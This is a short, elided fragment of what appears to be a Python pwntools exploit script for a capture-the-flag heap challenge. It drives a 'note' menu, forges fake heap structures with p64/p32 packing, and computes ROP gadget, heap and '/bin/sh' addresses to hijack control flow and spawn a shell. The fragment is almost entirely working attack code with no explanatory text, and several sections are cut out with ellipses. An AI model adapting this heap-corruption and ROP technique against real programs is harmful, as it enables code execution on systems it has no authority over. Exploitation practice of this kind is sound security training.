...
t=0.05
# gadget 
offset = 288-1328-0x30
ret = 0x937
leave_ret = 0x42351

# def
def menu(sel):
	p.sendafter('> ', sel);sleep(t)

def note(cell,size,note):
	menu('note')
	p.sendafter('Cell: ',str(cell));sleep(t)
	p.sendafter('Size: ',str(size));sleep(t)
	p.sendafter('Note: ',note);sleep(t)
...
fake_info += p64(0)+p64(0)
fake_info += p64(0)+p32(0)+p32(0xa)
...
rop_addr = 78368+offset
binsh_addr = 78440+offset
...
# == Control p2 == #
p2 = 76816+offset+0x30
p3 = 78144-0x90+offset
c4 = 73664
c5 = 73808
...
fake_info += p64(0)+p64(0x70)
fake_info += p64(heap_base+p2)+p64(heap_base+p3)
